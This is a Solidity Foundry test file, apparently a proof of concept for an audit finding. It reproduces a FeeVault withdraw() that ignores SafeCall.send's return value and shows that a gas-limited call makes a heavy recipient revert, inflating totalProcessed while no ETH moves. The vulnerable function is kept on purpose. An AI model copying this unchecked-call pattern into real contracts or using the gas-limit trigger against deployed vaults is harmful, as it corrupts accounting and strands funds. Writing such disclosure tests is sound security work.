// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/// @notice SafeCall library — the `send` helper reproduced VERBATIM from the
///         audited Optimism/Base repo (SafeCall.sol lines 12-30). It performs a
///         low-level `call` and RETURNS the success flag instead of reverting on
///         failure. Whether the caller checks that flag is the caller's problem.
library SafeCall {
    function send(
        address _target,
        uint256 _gas,
        uint256 _value
    ) internal returns (bool) {
        bool _success;
        assembly {
            _success := call(
                _gas, // gas
                _target, // recipient
                _value, // ether value
                0, // inloc
                0, // inlen
                0, // outloc
                0 // outlen
            )
        }
        return _success;
    }
}

/// @notice Minimal stubs so the (unused) L1 branch of withdraw() compiles.
///         The reproduction only exercises the L2 branch.
library Predeploys {
    address internal constant L2_STANDARD_BRIDGE = 0x4200000000000000000000000000000000000010;
}

interface L2StandardBridge {
    function bridgeETHTo(address _to, uint32 _minGasLimit, bytes calldata _extraData) external payable;
}

/// @notice Reduced FeeVault. The `withdraw()` function body is preserved VERBATIM
///         from the finding (FeeVault.sol). `totalProcessed` is meant to track the
///         cumulative amount of ETH actually disbursed to RECIPIENT.
abstract contract FeeVault {
    enum WithdrawalNetwork {
        L1,
        L2
    }

    address public immutable RECIPIENT;
    uint256 public immutable MIN_WITHDRAWAL_AMOUNT;
    WithdrawalNetwork public immutable WITHDRAWAL_NETWORK;
    uint32 internal constant WITHDRAWAL_MIN_GAS = 35_000;

    /// @notice Accounting counter: intended to equal total ETH sent to RECIPIENT.
    uint256 public totalProcessed;

    event Withdrawal(uint256 value, address to, address from);
    event Withdrawal(uint256 value, address to, address from, WithdrawalNetwork withdrawalNetwork);

    constructor(address _recipient, uint256 _minWithdrawalAmount, WithdrawalNetwork _withdrawalNetwork) {
        RECIPIENT = _recipient;
        MIN_WITHDRAWAL_AMOUNT = _minWithdrawalAmount;
        WITHDRAWAL_NETWORK = _withdrawalNetwork;
    }

    receive() external payable {}

    // ------------------------------------------------------------------
    // VULNERABLE FUNCTION (verbatim from the finding, FeeVault.sol L105-106)
    // ------------------------------------------------------------------
    function withdraw() external {
        require(
            address(this).balance >= MIN_WITHDRAWAL_AMOUNT,
            "FeeVault: withdrawal amount must be greater than minimum withdrawal amount"
        );
        uint256 value = address(this).balance;
        totalProcessed += value;
        emit Withdrawal(value, RECIPIENT, msg.sender);
        emit Withdrawal(value, RECIPIENT, msg.sender, WITHDRAWAL_NETWORK);
        if (WITHDRAWAL_NETWORK == WithdrawalNetwork.L2) {
            SafeCall.send(RECIPIENT, gasleft(), value);
        } else {
            L2StandardBridge(payable(Predeploys.L2_STANDARD_BRIDGE)).bridgeETHTo{ value: value }(
                RECIPIENT,
                WITHDRAWAL_MIN_GAS,
                bytes("")
            );
        }
    }
}

contract BaseFeeVault is FeeVault {
    constructor(address _recipient, uint256 _minWithdrawalAmount, FeeVault.WithdrawalNetwork _withdrawalNetwork)
        FeeVault(_recipient, _minWithdrawalAmount, _withdrawalNetwork)
    {}
}

/// @notice Models a LEGITIMATE but gas-heavy recipient (the real RECIPIENT is a
///         FeeDisburser whose receive() does non-trivial work). When `withdraw()`
///         is called with a constrained gas budget, the gas forwarded to this
///         recipient (63/64 of the vault's remaining gas) is insufficient, so
///         receive() runs OUT OF GAS and reverts. The low-level `call` in
///         SafeCall.send then returns `false` — which withdraw() never checks.
contract GasHeavyRecipient {
    mapping(uint256 => uint256) public store;

    receive() external payable {
        // Cold SSTOREs (~22.1k gas each): needs billions of gas to finish, so it
        // is guaranteed to run out of the ~sub-1M gas actually forwarded. Bounded
        // by the loop count, so it reverts on OOG rather than hanging.
        for (uint256 i = 1; i <= 100_000; i++) {
            store[i] = i;
        }
    }
}

contract FeeVaultTotalProcessedTest is Test {
    BaseFeeVault feeVault;
    GasHeavyRecipient recipient;

    function setUp() public {
        recipient = new GasHeavyRecipient();
        feeVault = new BaseFeeVault(address(recipient), 2 ether, FeeVault.WithdrawalNetwork.L2);
    }

    function test_totalProcessedInflatedWithoutSendingFunds() public {
        vm.deal(address(feeVault), 10 ether);

        // --- Preconditions ---
        assertEq(feeVault.totalProcessed(), 0, "pre: totalProcessed starts at 0");
        assertEq(address(feeVault).balance, 10 ether, "pre: vault holds 10 ETH");
        assertEq(address(recipient).balance, 0, "pre: recipient has nothing");

        // --- Trigger ---
        // ANY user calls the permissionless withdraw() forwarding a limited gas
        // budget. The gas-heavy recipient runs out of gas inside receive(), so the
        // value-bearing low-level call reverts and SafeCall.send() returns false.
        // Because withdraw() ignores that return value, it completes successfully.
        feeVault.withdraw{ gas: 1_000_000 }();

        // --- Harm: accounting corruption ---
        // totalProcessed claims the full balance was disbursed ...
        assertEq(feeVault.totalProcessed(), 10 ether, "HARM: totalProcessed inflated by full balance");
        // ... but NO ETH ever left the vault (the reverted call rolled back the
        // value transfer) and the recipient received nothing.
        assertEq(address(feeVault).balance, 10 ether, "HARM: funds are still stuck in the vault");
        assertEq(address(recipient).balance, 0, "HARM: recipient received nothing");
    }
}
